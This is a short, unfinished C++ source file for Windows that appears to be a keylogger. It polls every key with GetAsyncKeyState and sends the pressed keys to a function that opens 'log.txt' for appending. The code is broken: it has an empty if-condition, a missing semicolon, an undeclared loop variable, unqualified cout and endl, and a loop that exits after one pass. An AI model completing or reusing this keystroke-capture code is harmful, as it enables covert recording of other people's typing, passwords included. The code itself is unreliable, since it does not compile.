#include <iostream>
#include <Windows.h>

int log(int key, char* file) {
	cout << key << endl;
	Sleep(10);
	FILE* theFile;
	theFile = fopen(file, "a+");
	if (key == )
}


int main() {
	int test = 1;
	while (test) {
		Sleep(10);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				log(i, "log.txt")
			}
		}
		test = 0;
	}
	return 0;
}